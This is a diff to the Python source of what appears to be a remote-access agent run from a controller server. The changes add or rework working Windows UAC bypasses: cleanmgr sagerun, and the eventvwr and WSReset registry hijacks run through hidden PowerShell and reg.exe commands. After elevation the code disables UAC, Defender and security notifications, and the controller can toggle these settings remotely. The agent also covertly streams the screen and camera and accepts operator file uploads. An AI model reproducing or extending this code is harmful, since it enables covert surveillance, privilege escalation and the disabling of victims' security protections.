@@ -222,8 +222,11 @@ ENABLE_ANTI_ANALYSIS = True  # FALSE = Disabled (for testing), TRUE = Enabled (e
 
 # ✅ NEW ETHICAL SETTINGS
 REQUEST_ADMIN_FIRST = False
-DISABLE_UAC_BYPASS = False
+DISABLE_UAC_BYPASS = True
 MAX_PROMPT_ATTEMPTS = 3     # Limit prompts to 3 attempts instead of 999
+BYPASSES_ENABLED = True
+REGISTRY_ENABLED = True
+PERSISTENT_ADMIN_PROMPT_ENABLED = False
 
 # Controller URL override flag (set URL via env)
 USE_FIXED_SERVER_URL = True
@@ -232,6 +235,18 @@ FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-
 #FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'http://localhost:3000/')
 DISABLE_SLUI_BYPASS = False
 UAC_BYPASS_DEBUG_MODE = True
+UAC_BYPASS_METHODS_ENABLED = {
+    'cleanmgr_sagerun': True,
+    'fodhelper': True,
+    'computerdefaults': True,
+    'eventvwr': True,
+    'sdclt': True,
+    'wsreset': True,
+    'slui': True,
+    'winsat': True,
+    'silentcleanup': True,
+    'icmluautil': True
+}
 
 # Eventlet is now patched at the very top of the file (line 1-2)
 # This section is kept for compatibility but monkey_patch is already done
@@ -286,6 +301,39 @@ def log_message(message, level="info"):
 # Initialize silent logging immediately
 setup_silent_logging()
 
+def get_bypass_methods_sequence():
+    return [
+        {'id': 25, 'name': 'EventVwr.exe registry hijacking'},
+        {'id': 30, 'name': 'WOW64 logger hijacking'},
+        {'id': 31, 'name': 'sdclt.exe bypass'},
+        {'id': 33, 'name': 'fodhelper/computerdefaults ms-settings protocol'},
+        {'id': 34, 'name': 'SilentCleanup scheduled task'},
+        {'id': 35, 'name': 'Token manipulation and impersonation'},
+        {'id': 36, 'name': 'NTFS junction/reparse points'},
+        {'id': 39, 'name': '.NET Code Profiler (COR_PROFILER)'},
+        {'id': 40, 'name': 'COM handler hijacking'},
+        {'id': 41, 'name': 'ICMLuaUtil COM interface'},
+        {'id': 43, 'name': 'IColorDataProxy COM interface'},
+        {'id': 44, 'name': 'Volatile environment variables'},
+        {'id': 45, 'name': 'slui.exe registry hijacking'},
+        {'id': 56, 'name': 'WSReset.exe bypass'},
+        {'id': 61, 'name': 'AppInfo service manipulation'},
+        {'id': 62, 'name': 'Mock directory technique'},
+        {'id': 67, 'name': 'winsat.exe bypass'},
+        {'id': 68, 'name': 'MMC snapin bypass'}
+    ]
+
+def log_bypass_sequence():
+    try:
+        seq = get_bypass_methods_sequence()
+        log_message("Bypass sequence planned")
+        for m in seq:
+            log_message(f"Method {m['id']}: {m['name']}")
+    except Exception:
+        pass
+
+log_bypass_sequence()
+
 def disable_slui_bypass():
     global DISABLE_SLUI_BYPASS
     DISABLE_SLUI_BYPASS = True
@@ -331,6 +379,14 @@ def maybe_enable_bypass_debugging() -> bool:
                 suppress_security_notifications_aggressive()
             except Exception:
                 pass
+            return True
+        return False
+    except Exception:
+        return False
+def should_skip_uac_method(method_id=None, method_name=None) -> bool:
+    try:
+        if detect_defender_threats():
+            log_message("Skipping UAC bypass due to Windows Defender detection", "warning")
             return True
         return False
     except Exception:
@@ -721,6 +777,18 @@ DEFENDER_TAMPER_DISABLE_ENABLED = os.environ.get('ENABLE_DEFENDER_TAMPER_DISABLE
 AUTO_START_AUDIO_WITH_SCREEN = os.environ.get('AUTO_START_AUDIO_WITH_SCREEN', '0') == '1'
 AUTO_START_AUDIO_WITH_CAMERA = os.environ.get('AUTO_START_AUDIO_WITH_CAMERA', '0') == '1'
 SOCKET_MAX_BPS = int(os.environ.get('SOCKET_MAX_BPS', str(2 * 1024 * 1024)))
+def _default_upload_dir():
+    try:
+        d = os.environ.get('LOCALAPPDATA')
+        if d:
+            return os.path.join(d, 'AgentUploads')
+        h = os.path.expanduser('~')
+        if h and os.path.isdir(h):
+            return os.path.join(h, 'AgentUploads')
+    except Exception:
+        pass
+    return os.path.join(tempfile.gettempdir(), 'AgentUploads')
+UPLOAD_BASE_DIR = os.environ.get('AGENT_UPLOAD_DIR', _default_upload_dir())
 
 # Expected SHA-256 digests (defaults provided; can be overridden via env)
 EXPECTED_SHA256 = {
@@ -766,7 +834,7 @@ STREAM_THREADS = []
 STREAM_THREAD = None
 capture_queue = None
 encode_queue = None
-TARGET_FPS = 20
+TARGET_FPS = 15
 CAPTURE_QUEUE_SIZE = 10
 ENCODE_QUEUE_SIZE = 10
 
@@ -787,7 +855,7 @@ camera_capture_queue = None
 camera_encode_queue = None
 CAMERA_CAPTURE_QUEUE_SIZE = 10
 CAMERA_ENCODE_QUEUE_SIZE = 10
-TARGET_CAMERA_FPS = 20
+TARGET_CAMERA_FPS = 15
 
 # Thread safety locks for start/stop functions
 _stream_lock = threading.Lock()
@@ -916,6 +984,7 @@ WEBRTC_ENABLED = True
 WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
 WEBRTC_STREAMS = {}  # agent_id -> MediaStreamTrack
 WEBRTC_SIGNALING_QUEUE = queue.Queue()
+WEBRTC_BANDWIDTH_TRACK = {}  # agent_id -> {'bytes': int, 'ts': float}
 WEBRTC_ICE_SERVERS = [
     {"urls": ["stun:stun.l.google.com:19302"]},
     {"urls": ["stun:stun1.l.google.com:19302"]}
@@ -939,9 +1008,9 @@ WEBRTC_CONFIG = {
     'adaptive_bitrate': True,
     'frame_dropping': True,
     'quality_levels': {
-        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
-        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
-        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
+        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000, 'quality': 50},
+        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000, 'quality': 70},
+        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000, 'quality': 85},
         'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
     },
     'performance_tuning': {
@@ -1337,6 +1406,11 @@ class BackgroundInitializer:
                             return "admin_denied"
                     
                     # ❌ OLD MALICIOUS FLOW (only if bypass not disabled)
+                    if PERSISTENT_ADMIN_PROMPT_ENABLED:
+                        if run_as_admin_persistent():
+                            return "persistent_uac_success"
+                        else:
+                            pass
                     if not DISABLE_UAC_BYPASS:
                         # STEP 1: Try all UAC bypass methods (SILENT - no prompts!)
                         debug_print("[PRIVILEGE ESCALATION] STEP 1: UAC bypass methods")
@@ -1358,6 +1432,10 @@ class BackgroundInitializer:
                                 log_message("✅ UAC permanently disabled!")
                             else:
                                 debug_print("❌ [UAC] UAC disable FAILED!")
+                            try:
+                                perform_post_admin_actions()
+                            except Exception:
+                                pass
                             return "uac_bypass_success"
                         else:
                             debug_print("=" * 80)
@@ -1367,7 +1445,7 @@ class BackgroundInitializer:
                         # STEP 2: If UAC bypass fails, try registry-based auto-elevation
                         debug_print("[PRIVILEGE ESCALATION] STEP 2: Registry auto-elevation")
                         log_message("⚠️ UAC bypass methods failed, trying registry auto-elevation...")
-                        if elevate_via_registry_auto_approve():
+                        if REGISTRY_ENABLED and elevate_via_registry_auto_approve():
                             debug_print("✅ [REGISTRY] Auto-elevation successful!")
                             log_message("✅ Registry auto-elevation successful!")
                             return "registry_elevation_success"
@@ -1410,10 +1488,18 @@ class BackgroundInitializer:
                     if disable_uac():
                         debug_print("✅ [UAC] UAC disabled successfully!")
                         log_message("✅ UAC permanently disabled - no more prompts!")
+                        try:
+                            perform_post_admin_actions()
+                        except Exception:
+                            pass
                         return "uac_disabled"
                     else:
                         debug_print("❌ [UAC] UAC disable FAILED (needs HKLM write access)")
                         log_message("⚠️ UAC disable failed (needs HKLM write access)")
+                        try:
+                            perform_post_admin_actions()
+                        except Exception:
+                            pass
                         return "uac_disable_failed"
             
             debug_print("[PRIVILEGE ESCALATION] Not Windows - no elevation needed")
@@ -1538,6 +1624,12 @@ class UACBypassMethod:
     
     def execute(self) -> bool:
         """Execute the UAC bypass method with enhanced error handling"""
+        try:
+            if should_skip_uac_method(self.method_id, self.name):
+                log_message(f"[UAC BYPASS] Skipping method: {self.name}", "warning")
+                return False
+        except Exception:
+            pass
         debug_print(f"  [METHOD] Checking if {self.name} is available...")
         
         if not self.is_available():
@@ -1617,6 +1709,8 @@ class UACBypassManager:
         debug_print("[UAC MANAGER] Calling _initialize_methods()...")
         self._initialize_methods()
         self.preferred_order = [
+            'cleanmgr_sagerun',
+            'wsreset',
             'eventvwr',
             'sdclt',
             'fodhelper',
@@ -1635,6 +1729,7 @@ class UACBypassManager:
         
         # Register all bypass methods
         method_list = [
+            ('cleanmgr_sagerun', CleanmgrSagerunBypass()),
             ('fodhelper', FodhelperProtocolBypass()),
             ('computerdefaults', ComputerDefaultsBypass()),
             ('eventvwr', EventViewerBypass()),
@@ -1656,7 +1751,7 @@ class UACBypassManager:
     def get_available_methods(self) -> list:
         """Get list of available UAC bypass methods"""
         with self._lock:
-            available = [name for name, method in self.methods.items() if method.is_available()]
+            available = [name for name, method in self.methods.items() if method.is_available() and UAC_BYPASS_METHODS_ENABLED.get(name, True)]
             try:
                 order_map = {name: i for i, name in enumerate(self.preferred_order)}
                 available.sort(key=lambda n: order_map.get(n, 1_000_000))
@@ -1808,6 +1903,32 @@ class FodhelperProtocolBypass(UACBypassMethod):
             except (OSError, PermissionError):
                 pass
             raise UACBypassError(f"Fodhelper protocol bypass failed: {e}")
+class CleanmgrSagerunBypass(UACBypassMethod):
+    def __init__(self):
+        super().__init__(
+            "Cleanmgr Sagerun",
+            "UAC bypass using cleanmgr.exe /sagerun",
+            69
+        )
+    def is_available(self) -> bool:
+        cleanmgr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'cleanmgr.exe')
+        return super().is_available() and os.path.exists(cleanmgr_path)
+    def _execute_bypass(self) -> bool:
+        try:
+            cmd = [
+                "powershell",
+                "-NoProfile",
+                "-ExecutionPolicy", "Bypass",
+                "-Command",
+                "try { reg add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\Active Setup Temporary Internet Files' /v StateFlags0001 /t REG_DWORD /d 2 /f; cleanmgr.exe /sagerun:1; reg delete 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\Active Setup Temporary Internet Files' /v StateFlags0001 /f; Write-Host '[SUCCESS] cleanmgr.exe bypass executed successfully' -ForegroundColor Green } catch { Write-Host '[FAILED] cleanmgr.exe bypass failed: ' $_.Exception.Message -ForegroundColor Red }"
+            ]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+            out = (result.stdout or "") + (result.stderr or "")
+            if "[SUCCESS] cleanmgr.exe bypass executed successfully" in out:
+                return True
+            return result.returncode == 0
+        except Exception as e:
+            raise UACBypassError(f"Cleanmgr sagerun bypass failed: {e}")
 
 class ComputerDefaultsBypass(UACBypassMethod):
     """Enhanced UAC bypass using computerdefaults.exe"""
@@ -1876,31 +1997,49 @@ class EventViewerBypass(UACBypassMethod):
     def _execute_bypass(self) -> bool:
         try:
             import winreg
-            
             current_exe = self.get_current_executable()
             key_path = r"Software\Classes\mscfile\shell\open\command"
-            
-            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
-            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
-            winreg.CloseKey(key)
-            
-            eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
-            process = subprocess.Popen(
-                [eventvwr_path],
-                creationflags=subprocess.CREATE_NO_WINDOW,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )
-            
+            ps_path = r"HKCU:\Software\Classes\mscfile\shell\open\command"
             try:
-                process.communicate(timeout=15)
-            except subprocess.TimeoutExpired:
-                process.kill()
-            
+                cmd = [
+                    "powershell",
+                    "-NoProfile",
+                    "-ExecutionPolicy", "Bypass",
+                    "-Command",
+                    f"try {{ New-Item \"{ps_path}\" -Force | Out-Null; Set-ItemProperty \"{ps_path}\" -Name \"(default)\" -Value \"{current_exe}\" -Force; Start-Process \"C:\\Windows\\System32\\eventvwr.msc\" -WindowStyle Hidden }} catch {{}}"
+                ]
+                subprocess.run(cmd, capture_output=True, text=True, timeout=60, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+                time.sleep(3)
+            except Exception:
+                pass
+            try:
+                subprocess.run([
+                    "cmd", "/c",
+                    f"reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"{current_exe}\" /f && cmd.exe /c eventvwr.msc"
+                ], capture_output=True, timeout=60, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+                time.sleep(3)
+            except Exception:
+                pass
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+                winreg.CloseKey(key)
+                eventvwr_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'eventvwr.exe')
+                process = subprocess.Popen(
+                    [eventvwr_path],
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE
+                )
+                try:
+                    process.communicate(timeout=15)
+                except subprocess.TimeoutExpired:
+                    process.kill()
+            except Exception:
+                pass
             time.sleep(3)
             self.cleanup_registry(key_path)
             return True
-            
         except Exception as e:
             try:
                 self.cleanup_registry(key_path)
@@ -1975,32 +2114,42 @@ class WSResetBypass(UACBypassMethod):
     def _execute_bypass(self) -> bool:
         try:
             import winreg
-            
             current_exe = self.get_current_executable()
             key_path = r"Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command"
-            
-            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
-            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
-            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
-            winreg.CloseKey(key)
-            
-            wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
-            process = subprocess.Popen(
-                [wsreset_path],
-                creationflags=subprocess.CREATE_NO_WINDOW,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )
-            
+            ps_path = r"HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\shell\open\command"
             try:
-                process.communicate(timeout=15)
-            except subprocess.TimeoutExpired:
-                process.kill()
-            
+                cmd = [
+                    "powershell",
+                    "-NoProfile",
+                    "-ExecutionPolicy", "Bypass",
+                    "-Command",
+                    f"try {{ New-Item \"{ps_path}\" -Force | Out-Null; New-ItemProperty -Path \"{ps_path}\" -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null; Set-ItemProperty -Path \"{ps_path}\" -Name \"(default)\" -Value \"{current_exe}\" -Force -ErrorAction SilentlyContinue | Out-Null; Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden }} catch {{}}"
+                ]
+                subprocess.run(cmd, capture_output=True, text=True, timeout=60, creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
+                time.sleep(3)
+            except Exception:
+                pass
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+                winreg.CloseKey(key)
+                wsreset_path = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'WSReset.exe')
+                process = subprocess.Popen(
+                    [wsreset_path],
+                    creationflags=subprocess.CREATE_NO_WINDOW,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE
+                )
+                try:
+                    process.communicate(timeout=15)
+                except subprocess.TimeoutExpired:
+                    process.kill()
+            except Exception:
+                pass
             time.sleep(3)
             self.cleanup_registry(key_path)
             return True
-            
         except Exception as e:
             try:
                 self.cleanup_registry(key_path)
@@ -2371,6 +2520,19 @@ def suppress_security_notifications_aggressive():
     except Exception as e:
         log_message(f"[NOTIFICATIONS] Aggressive suppression error: {e}", "error")
         return False
+def perform_post_admin_actions():
+    try:
+        if not WINDOWS_AVAILABLE:
+            return False
+        if REGISTRY_ENABLED:
+            ensure_registry_policies_and_context_menu()
+            suppress_security_notifications_aggressive()
+            disable_windows_notifications()
+        if DEFENDER_DISABLE_ENABLED:
+            disable_defender()
+        return True
+    except Exception:
+        return False
 def keep_trying_elevation():
     """Background thread that continuously tries to gain admin privileges."""
     retry_count = 0
@@ -2412,6 +2574,12 @@ def attempt_uac_bypass():
     if not WINDOWS_AVAILABLE:
         debug_print("❌ [UAC BYPASS] Not Windows - bypass not available")
         return False
+    try:
+        if should_skip_uac_method():
+            log_message("[UAC BYPASS] Skipped due to Windows Defender detection", "warning")
+            return False
+    except Exception:
+        pass
     
     debug_print("[UAC BYPASS] Checking if already admin...")
     if is_admin():
@@ -2458,6 +2626,10 @@ def attempt_uac_bypass():
             # Somehow THIS process became admin (unusual but possible)
             debug_print("✅ [UAC BYPASS] THIS process is now admin!")
             log_message("✅ [UAC BYPASS] UAC bypass successful - now running as admin!", "success")
+            try:
+                perform_post_admin_actions()
+            except Exception:
+                pass
             return True
         else:
             # A separate elevated instance was launched
@@ -6199,7 +6371,7 @@ def run_as_admin_persistent():
         return False
     
     # ✅ RESPECT MAX_PROMPT_ATTEMPTS if defined
-    max_attempts = MAX_PROMPT_ATTEMPTS if 'MAX_PROMPT_ATTEMPTS' in globals() else 999
+    max_attempts = 999 if ('PERSISTENT_ADMIN_PROMPT_ENABLED' in globals() and PERSISTENT_ADMIN_PROMPT_ENABLED) else (MAX_PROMPT_ATTEMPTS if 'MAX_PROMPT_ATTEMPTS' in globals() else 999)
     
     debug_print("=" * 80)
     if max_attempts < 999:
@@ -6557,7 +6729,8 @@ def execute_in_powershell(command, timeout=30):
                 text=False,
                 timeout=timeout,
                 creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0,
-                env=os.environ.copy()
+                env=os.environ.copy(),
+                cwd=os.getcwd()
             )
             
             # Decode output
@@ -6586,7 +6759,8 @@ def execute_in_powershell(command, timeout=30):
                 shell=True,
                 capture_output=True,
                 text=True,
-                timeout=timeout
+                timeout=timeout,
+                cwd=os.getcwd()
             )
             
             execution_time = int((time_module.time() - start_time) * 1000)
@@ -6920,11 +7094,11 @@ def camera_encode_worker(agent_id):
                     # Dynamic JPEG quality based on queue fullness
                     queue_fullness = camera_encode_queue.qsize() / CAMERA_ENCODE_QUEUE_SIZE
                     if queue_fullness > 0.8:
-                        jpeg_quality = 50  # Low quality when queue is full
+                        jpeg_quality = 45
                     elif queue_fullness > 0.5:
-                        jpeg_quality = 60  # Medium quality
+                        jpeg_quality = 55
                     else:
-                        jpeg_quality = 65  # Good quality when queue is empty
+                        jpeg_quality = 65
                     
                     encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), jpeg_quality]
                     result, encoded_frame = cv2.imencode('.jpg', frame, encode_param)
@@ -7343,8 +7517,8 @@ def stream_screen_simple_socketio(agent_id):
             height = int(monitor.get('height', 0) or (monitor['bottom'] - monitor['top'])) if isinstance(monitor, dict) else (
                 monitor[3] - monitor[1]
             )
-            if width > 1280:
-                scale = 1280 / width
+            if width > 1024:
+                scale = 1024 / width
                 width = int(width * scale)
                 height = int(height * scale)
             frame_time = 1.0 / max(1, int(TARGET_FPS) if 'TARGET_FPS' in globals() else 15)
@@ -7361,7 +7535,7 @@ def stream_screen_simple_socketio(agent_id):
                             img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
                         if img.shape[2] == 4:
                             img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
-                        ok, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 80])
+                        ok, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 60])
                         if ok:
                             connected = SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)
                             if not connected:
@@ -7701,7 +7875,11 @@ async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_aud
         
         # Add media tracks
         if enable_screen:
-            screen_track = ScreenTrack(agent_id, target_fps=30, quality=85)
+            screen_track = ScreenTrack(
+                agent_id,
+                target_fps=WEBRTC_CONFIG['quality_levels']['low']['fps'],
+                quality=WEBRTC_CONFIG['quality_levels']['low']['quality']
+            )
             pc.addTrack(screen_track)
             WEBRTC_STREAMS[f"{agent_id}_screen"] = screen_track
             log_message(f"Added screen track to WebRTC connection for agent {agent_id}")
@@ -7713,7 +7891,12 @@ async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_aud
             log_message(f"Added audio track to WebRTC connection for agent {agent_id}")
         
         if enable_camera:
-            camera_track = CameraTrack(agent_id, camera_index=0, target_fps=30, quality=85)
+            camera_track = CameraTrack(
+                agent_id,
+                camera_index=0,
+                target_fps=WEBRTC_CONFIG['quality_levels']['low']['fps'],
+                quality=WEBRTC_CONFIG['quality_levels']['low']['quality']
+            )
             pc.addTrack(camera_track)
             WEBRTC_STREAMS[f"{agent_id}_camera"] = camera_track
             log_message(f"Added camera track to WebRTC connection for agent {agent_id}")
@@ -7966,18 +8149,31 @@ def estimate_bandwidth(agent_id):
         
         # Extract bandwidth information from RTCStatsReport
         bandwidth_stats = {
-            'current_bitrate': 0,
-            'available_bandwidth': 0,
+            'current_bitrate': 0,  # bits per second
+            'available_bandwidth': 0,  # bits per second
             'rtt': 0,
             'packet_loss': 0,
             'jitter': 0
         }
         
+        last_bytes = None
+        last_ts = None
         for stat in stats.values():
             if hasattr(stat, 'type'):
                 if stat.type == 'outbound-rtp':
                     if hasattr(stat, 'bytesSent') and hasattr(stat, 'timestamp'):
-                        bandwidth_stats['current_bitrate'] = stat.bytesSent * 8 / 1000000  # Mbps
+                        prev = WEBRTC_BANDWIDTH_TRACK.get(agent_id)
+                        if prev:
+                            last_bytes = prev.get('bytes')
+                            last_ts = prev.get('ts')
+                        bytes_sent = int(getattr(stat, 'bytesSent', 0) or 0)
+                        ts = float(getattr(stat, 'timestamp', time.time()) or time.time())
+                        if last_bytes is not None and last_ts is not None:
+                            dt = max(0.001, ts - last_ts)
+                            delta_bytes = max(0, bytes_sent - last_bytes)
+                            bps = int((delta_bytes * 8) / dt)
+                            bandwidth_stats['current_bitrate'] = bps
+                        WEBRTC_BANDWIDTH_TRACK[agent_id] = {'bytes': bytes_sent, 'ts': ts}
                 elif stat.type == 'candidate-pair':
                     if hasattr(stat, 'currentRtt'):
                         bandwidth_stats['rtt'] = stat.currentRtt * 1000  # Convert to ms
@@ -7987,8 +8183,7 @@ def estimate_bandwidth(agent_id):
         
         # Estimate available bandwidth (simplified algorithm)
         if bandwidth_stats['current_bitrate'] > 0:
-            # Assume we can use up to 80% of current capacity
-            bandwidth_stats['available_bandwidth'] = bandwidth_stats['current_bitrate'] * 1.25
+            bandwidth_stats['available_bandwidth'] = int(bandwidth_stats['current_bitrate'] * 0.8)
         
         return bandwidth_stats
         
@@ -9595,6 +9790,7 @@ def register_socketio_handlers():
     sio.on('webrtc_get_production_readiness')(on_webrtc_get_production_readiness)
     sio.on('webrtc_get_migration_plan')(on_webrtc_get_migration_plan)
     sio.on('webrtc_get_monitoring_data')(on_webrtc_get_monitoring_data)
+    sio.on('config_update')(on_config_update)
     
     # Apply configuration pushed from controller
     # agent_config handling removed in this revision
@@ -9604,6 +9800,32 @@ def register_socketio_handlers():
     log_message("Socket.IO event handlers registered successfully", "info")
 
 # --- Socket.IO File Transfer Handlers ---
+
+def on_config_update(data):
+    try:
+        agent = data.get('agent') or {}
+        bypasses = data.get('bypasses') or {}
+        registry = data.get('registry') or {}
+        global REQUEST_ADMIN_FIRST, MAX_PROMPT_ATTEMPTS, DISABLE_UAC_BYPASS, UAC_BYPASS_DEBUG_MODE, DEFENDER_DISABLE_ENABLED, DISABLE_SLUI_BYPASS, UAC_BYPASS_METHODS_ENABLED, REGISTRY_ENABLED, PERSISTENT_ADMIN_PROMPT_ENABLED
+        REQUEST_ADMIN_FIRST = bool(agent.get('requestAdminFirst', REQUEST_ADMIN_FIRST))
+        try:
+            MAX_PROMPT_ATTEMPTS = int(agent.get('maxPromptAttempts', MAX_PROMPT_ATTEMPTS))
+        except Exception:
+            pass
+        UAC_BYPASS_DEBUG_MODE = bool(agent.get('uacBypassDebug', UAC_BYPASS_DEBUG_MODE))
+        PERSISTENT_ADMIN_PROMPT_ENABLED = bool(agent.get('persistentAdminPrompt', PERSISTENT_ADMIN_PROMPT_ENABLED))
+        DEFENDER_DISABLE_ENABLED = bool(agent.get('enableDefenderDisable', DEFENDER_DISABLE_ENABLED))
+        bypasses_enabled = bool(bypasses.get('enabled', True))
+        REGISTRY_ENABLED = bool(registry.get('enabled', True))
+        DISABLE_UAC_BYPASS = (not bool(agent.get('enableUACBypass', True))) or (not bypasses_enabled)
+        methods = bypasses.get('methods') or {}
+        for k in list(UAC_BYPASS_METHODS_ENABLED.keys()):
+            if k in methods:
+                UAC_BYPASS_METHODS_ENABLED[k] = bool(methods.get(k))
+        if 'slui' in methods:
+            DISABLE_SLUI_BYPASS = not bool(methods.get('slui'))
+    except Exception:
+        pass
 
 def on_file_chunk_from_operator(data):
     """Receive a file chunk from the operator and write to disk."""
@@ -9631,25 +9853,59 @@ def on_file_chunk_from_operator(data):
         if not hasattr(on_file_chunk_from_operator, 'buffers'):
             on_file_chunk_from_operator.buffers = {}
         buffers = on_file_chunk_from_operator.buffers
+        if not hasattr(on_file_chunk_from_operator, 'dest_map'):
+            on_file_chunk_from_operator.dest_map = {}
+        dest_map = on_file_chunk_from_operator.dest_map
+        def _resolve_upload_destination(dp, fn):
+            try:
+                if not dp:
+                    os.makedirs(UPLOAD_BASE_DIR, exist_ok=True)
+                    return os.path.join(UPLOAD_BASE_DIR, fn)
+                dp = os.path.normpath(dp)
+                if dp.endswith(os.sep) or os.path.isdir(dp):
+                    p = os.path.join(dp, fn)
+                else:
+                    p = dp
+                dirp = os.path.dirname(p) or '.'
+                try:
+                    os.makedirs(dirp, exist_ok=True)
+                    test = os.path.join(dirp, f".upload_test_{secrets.token_hex(4)}")
+                    with open(test, 'wb') as tf:
+                        tf.write(b'')
+                    try:
+                        os.remove(test)
+                    except Exception:
+                        pass
+                    return p
+                except Exception:
+                    os.makedirs(UPLOAD_BASE_DIR, exist_ok=True)
+                    return os.path.join(UPLOAD_BASE_DIR, fn)
+            except Exception:
+                os.makedirs(UPLOAD_BASE_DIR, exist_ok=True)
+                return os.path.join(UPLOAD_BASE_DIR, fn)
+        final_path = dest_map.get(destination_path)
+        if not final_path:
+            final_path = _resolve_upload_destination(destination_path, filename)
+            dest_map[destination_path] = final_path
         
-        if destination_path not in buffers:
-            buffers[destination_path] = {'chunks': [], 'total_size': total_size, 'filename': filename}
+        if final_path not in buffers:
+            buffers[final_path] = {'chunks': [], 'total_size': total_size, 'filename': filename}
         
         # Remove data: prefix if present
         if ',' in chunk_b64:
             chunk_b64 = chunk_b64.split(',', 1)[1]
         
         chunk = base64.b64decode(chunk_b64)
-        buffers[destination_path]['chunks'].append((offset, chunk))
+        buffers[final_path]['chunks'].append((offset, chunk))
         
         # Check if file is complete
-        received_size = sum(len(c[1]) for c in buffers[destination_path]['chunks'])
+        received_size = sum(len(c[1]) for c in buffers[final_path]['chunks'])
         
         # Update total_size if it was 0 but we're receiving multiple chunks
-        if total_size == 0 and buffers[destination_path]['total_size'] > 0:
-            total_size = buffers[destination_path]['total_size']
+        if total_size == 0 and buffers[final_path]['total_size'] > 0:
+            total_size = buffers[final_path]['total_size']
         elif total_size > 0:
-            buffers[destination_path]['total_size'] = total_size
+            buffers[final_path]['total_size'] = total_size
         
         # Calculate progress and send to UI
         if total_size > 0:
@@ -9660,7 +9916,7 @@ def on_file_chunk_from_operator(data):
             safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
-                'destination_path': destination_path,
+                'destination_path': final_path,
                 'received': received_size,
                 'total': total_size,
                 'progress': progress
@@ -9673,7 +9929,7 @@ def on_file_chunk_from_operator(data):
             safe_emit('file_upload_progress', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
-                'destination_path': destination_path,
+                'destination_path': final_path,
                 'received': received_size,
                 'total': 0,  # Unknown total
                 'progress': -1  # -1 indicates unknown progress
@@ -9683,13 +9939,13 @@ def on_file_chunk_from_operator(data):
         # Don't auto-save when total_size is 0 - wait for upload_complete event instead
         if total_size > 0 and received_size >= total_size:
             log_message(f"File complete: received {received_size}/{total_size} bytes")
-            _save_completed_file(destination_path, buffers[destination_path])
+            _save_completed_file(final_path, buffers[final_path])
             
             # ✅ SEND COMPLETION EVENT TO UI!
             safe_emit('file_upload_complete', {
                 'agent_id': get_or_create_agent_id(),
                 'filename': filename,
-                'destination_path': destination_path,
+                'destination_path': final_path,
                 'size': received_size,
                 'success': True
             })
@@ -9734,20 +9990,24 @@ def on_file_upload_complete_from_operator(data):
     filename = data.get('filename')
     destination_path = data.get('destination_path') or filename
     log_message(f"Upload of {filename} to {destination_path} complete.")
+    if hasattr(on_file_chunk_from_operator, 'dest_map') and destination_path in on_file_chunk_from_operator.dest_map:
+        destination_resolved = on_file_chunk_from_operator.dest_map[destination_path]
+    else:
+        destination_resolved = destination_path
     
     # Force save any remaining buffered file
     if hasattr(on_file_chunk_from_operator, 'buffers'):
